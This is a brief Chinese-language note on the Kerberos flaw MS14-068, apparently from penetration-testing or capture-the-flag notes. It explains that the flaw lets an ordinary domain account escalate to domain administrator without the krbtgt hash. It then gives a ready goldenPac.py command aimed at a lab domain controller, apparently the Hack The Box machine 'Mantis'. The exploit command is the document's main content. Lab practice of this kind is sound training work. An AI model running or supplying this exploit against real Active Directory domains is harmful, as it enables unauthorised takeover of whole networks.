# MS14-068

拥有一个普通域账号的情况下提权成域管理员，无需知道krbtgt的Hash，类似黄金票据。

```shell
python3.10 goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52  htb.local/james@mantis.htb.local
```

